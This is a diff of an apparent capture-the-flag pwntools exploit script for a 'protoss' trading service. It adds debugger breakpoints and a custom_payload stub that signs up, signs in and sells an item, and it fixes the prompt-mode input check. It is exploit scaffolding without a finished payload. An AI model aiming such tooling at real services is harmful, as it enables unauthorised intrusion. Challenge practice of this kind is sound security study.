@@ -1,6 +1,7 @@
-import module.protoss_handler
+from module.protoss_handler import *
 from pwn import *
 from pwn import p64
+from build.protoss_pb2 import ProtossInterface, SignUp, SignIn, Buy, Sell
 
 
 def slog(n, m): return success(': '.join([n, hex(m)]))
@@ -12,7 +13,7 @@ breakpoint = {
     'case_user_handler': '_Z13parse_handlerPKci+203',
     'case_exchange_handler': '_Z13parse_handlerPKci+231',
     'call_handle_my_info': '_Z12user_handlerPN7protoss16ProtossInterfaceE+458',
-    'call_handle_signout': '_Z12user_handlerPN7protoss16ProtossInterfaceE+380',
+    'call_handle_signout': '_Z12user_handlerPN7protoss16ProtossInterfaceE+397',
     'call_handle_signin': '_Z12user_handlerPN7protoss16ProtossInterfaceE+322',
     'call_handle_signup': '_Z12user_handlerPN7protoss16ProtossInterfaceE+198',
     'call_handle_buy': '_Z16exchange_handlerPN7protoss16ProtossInterfaceE+270',
@@ -51,16 +52,28 @@ else:
     pass
 
 # Write exploit code!
-def custom_payload():
-    pass
 
-select = input('Run prompt mode? [Y/N]: ')
-if select == 'Y' or 'y':
+
+def custom_payload():
+    user_signup(p, ProtossInterface(), USER_HANDLER,
+                set_signup('HyunBin', '1234'))
+    user_signin(p, ProtossInterface(), USER_HANDLER,
+                set_signin('HyunBin', '1234'))
+    sell(p, ProtossInterface(), EXCHANGE_HANDLER, set_sell(0, 10))
+
+    print('Done.')
+    print('Executing Protoss Handler Prompt')
+    prompt(p)
+
+select = input('Run prompt mode? [Y/N]: ').lower()
+if select == 'y':
     print('Run Protoss Handler prompt..')
     # Execute prompt
-    module.protoss_handler.prompt(p)
-elif select == 'N' or 'n':
+    prompt(p)
+elif select == 'n':
     print('Run Custom Code')
     custom_payload()
+else:
+    print('Wrong Input.')
 
 p.interactive()
